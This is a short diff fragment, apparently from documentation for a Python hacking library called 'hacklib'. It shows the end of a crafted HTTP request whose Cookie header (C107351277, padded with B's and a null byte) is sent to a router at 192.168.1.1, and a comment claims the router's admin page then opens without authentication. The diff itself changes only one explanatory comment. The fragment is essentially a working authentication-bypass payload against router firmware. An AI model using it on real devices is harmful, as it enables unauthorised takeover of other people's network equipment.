@@ -53,7 +53,7 @@ Accept-Language: en-US, en; q=0.5
 Accept-Encoding: gzip, deflate
 Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00''' + '\r\n\r\n'
 >>> hacklib.send('192.168.1.1', 80, payload)
-# The cookie replaced the firmware's Assembly code for web authentication with a null bye.
+# The cookie replaced the firmware's memory allocation for web authentication with a null bye.
 # The router's admin page is now fully accessible from any web browser.
 ```
 -
